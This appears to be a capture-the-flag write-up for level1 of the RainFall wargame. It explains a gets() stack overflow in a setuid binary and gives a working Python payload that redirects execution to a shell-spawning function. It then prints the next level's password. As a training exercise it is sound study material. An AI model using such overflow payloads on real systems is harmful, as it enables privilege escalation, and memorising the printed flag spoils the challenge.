There is a setuid binary "level1" own by level2

After disassembling the binary we can see that main() function call gets() on a 76 bytes buffer
The gets() function cannot be used securely, the use of this function enables malicious users
to arbitrarily change a running program's functionality through a buffer overflow attack.

We can also see a run() function that calls the system() function with "/bin/sh"

we can craft a overflow payload which contain 76 bytes of data
followed by the address of the run() function [0x08048444],
since it will be writen on the stack and use for the return address in main()

so we just need to pass the overflow payload to stdin

level1@RainFall:~$> (python -c "print 'A' * 76 + '\x44\x84\x04\x08'"; cat) | ./level1

level2@RainFall:~$> cat ~level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
